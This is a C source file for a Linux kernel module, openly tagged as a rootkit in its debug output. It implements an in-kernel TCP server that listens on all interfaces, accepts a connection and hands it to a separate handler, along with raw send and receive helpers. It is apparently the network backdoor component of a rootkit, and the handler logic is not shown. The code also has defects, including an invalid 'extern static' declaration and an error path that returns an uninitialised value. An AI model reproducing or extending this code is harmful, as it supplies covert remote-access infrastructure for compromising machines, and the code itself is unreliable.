/*
	tcp server that accepts one connection at a time
	sites that helped develop code:
		https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
		https://stackoverflow.com/questions/49340626/creating-a-tcp-server-in-the-kernel-in-c
*/

#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>

#define BUFFER_SIZE 2048

struct client_t{ //structure holding client information
	struct socket *sock; //structure holding socket object
	struct kvec sock_vec; //holds vector of data recieved
	struct msghdr sock_msg; //structure to hold data recieved
	char *message; //structure to hold message sent or recieved
};

struct server_t{
	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
	struct socket *sock; //structure holding socket object
	int port;
};

struct client_t client; //global variable holding  data associated with client for easy access by all functions

extern static int client_handler(void); //declares client handler function as external

/*========================*\
	networking functions
\*========================*/
static int run_server(int port){ //creates the server
	struct server_t server; //holds data associated with server
	int err; //int to hold error codes

	// kernel memory allocate a send and recieve buffer
	client.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
	if (client.message == NULL) { //if message is null
		printk(KERN_DEBUG "[rootkit] run_server- buffer kmalloc error!\n"); //prints debug info
		return err; //returns -1 for error
	}

	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr

	server.port = port; //sets port of server

	server.s_addr.sin_family = AF_INET; //sets the family
	server.s_addr.sin_port = htons(server.port); //sets the port
	server.s_addr.sin_addr.s_addr = INADDR_ANY; //sets the adress to any
	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
	client.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection

	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
	if (err < 0) { //if error creating socket
		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %i\n", err); //print debug info
		return -1; //returns -1 for error
	}
	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(client.sock)); //creates socket for connection
	if (err < 0) { //if error creating socket
		printk(KERN_DEBUG "[rootkit] net_connect- client socket creation error!- %i\n", err); //print debug info
		return -1; //returns -1 for error
	}

	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr)); //binds server
	if (err<0){ //if error binding
		printk(KERN_DEBUG "[rootkit] run_server- server bind error!- %i\n", err); //prints debug info
		return err; //returns -1 for error
	}

	err = server.sock->ops->listen(server.sock, 1); //listens for connections with 1 backlog
	if (err<0){ //if error listening
		printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
		return err; //returns -1 for error
	}

	while(true){
		err = server.sock->ops->accept(server.sock, client.sock, 0, 0); //accepts connection
		if (err<0){ //if error accepting conn
			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
			return err; //returns -1 for error
		}
		err = client_handler();
		if (err<0){ //if error with handling
			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %i\n", err); //prints debug info
			return err; //returns -1 for error
		}
	}
	return 0; //return 0  for no errors
}


static int net_send(void){ //sends data to the server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	if (strlen(client.message)==0){ //if no message to be sent
		printk(KERN_DEBUG "[rootkit] net_send- no message!"); //print debug info
		return -1; //return -1 for error
	}
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	client.sock_vec.iov_base = client.message; //sets the data to be sent
	client.sock_vec.iov_len = BUFFER_SIZE; //sets the size of the message

	err = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, BUFFER_SIZE); // sends data
	if (err < 0) { //if error sending message
		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!- %i\n", err); //print debug info
		return err; //return error
	}
	else if(err != BUFFER_SIZE){ //if not all data sent
		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message- %i\n", err); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

static int net_recv(void){ //recieves data from server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	client.sock_vec.iov_base=client.message; //sets the location of buffer for recieved data to be placed
	client.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message

	err = kernel_recvmsg(client.sock, &(client.sock_msg), &(client.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0); //recieves message
	if (err < 0){ //if error recieving message
		printk(KERN_DEBUG "[rootkit] net_recv: error recieving data"); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}
